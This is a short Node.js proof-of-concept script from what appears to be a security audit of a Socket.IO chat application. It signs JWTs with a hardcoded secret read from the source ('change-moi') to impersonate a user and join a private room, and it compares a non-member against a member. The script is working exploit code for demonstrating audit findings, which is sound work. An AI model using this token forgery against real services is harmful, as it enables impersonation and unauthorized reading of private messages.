// Preuve F-01 + F-02 : le secret lu dans le source permet de forger l'identite
// d'un membre du salon prive, et l'autorisation par room l'accepte legitimement.
// Usage : node audit/preuve-f01-f02-jeton-forge.mjs [url]
import { io } from 'socket.io-client'
import jwt from 'jsonwebtoken'

const URL = process.argv[2] ?? 'http://localhost:3010'
const SECRET = 'change-moi'          // lu dans src/realtime/security-helpers.ts:49

function essai(sub, salon) {
  return new Promise((resolve) => {
    const token = jwt.sign({ sub }, SECRET, { expiresIn: '1h' })
    const s = io(URL, { auth: { token }, transports: ['websocket'] })
    const fin = (r) => { s.close(); resolve(r) }
    s.on('connect_error', (e) => fin(`handshake REFUSE : ${e.message}`))
    s.on('connect', () => {
      s.emit('join', `salon:${salon}`, (ack) => {
        if (!ack?.ok) return fin(`join refuse : ${ack?.raison}`)
        fin(`join ACCEPTE, ${ack.messages.length} messages lus, dernierSeq=${ack.dernierSeq}`)
      })
    })
    setTimeout(() => fin('timeout'), 5000)
  })
}

console.log('sub=mallory (non membre) -> dev :', await essai('mallory', 'dev'))
console.log('sub=alice   (membre)     -> dev :', await essai('alice', 'dev'))
process.exit(0)
